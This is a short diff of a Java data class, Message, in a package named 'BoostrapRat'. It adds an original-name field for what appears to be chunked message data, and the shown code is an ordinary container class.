@@ -1,18 +1,20 @@
 package BoostrapRat;
 
 public class Message {
+	String originalName;
 	String name;
 	int part;
 	int qParts;
+	//String data;
 	byte[] data;
 	String paramsEncoding;
 	
 	
 	
 	
-	
-	public Message(String name, int part, int qParts, byte[] data, String paramsEncoding) {
+	public Message(String originalName, String name, int part, int qParts, byte[] data, String paramsEncoding) {
 		super();
+		this.originalName = originalName;
 		this.name = name;
 		this.part = part;
 		this.qParts = qParts;
@@ -54,6 +56,6 @@ public class Message {
 		this.paramsEncoding = paramsEncoding;
 	}
 	
-	
+
 
 }
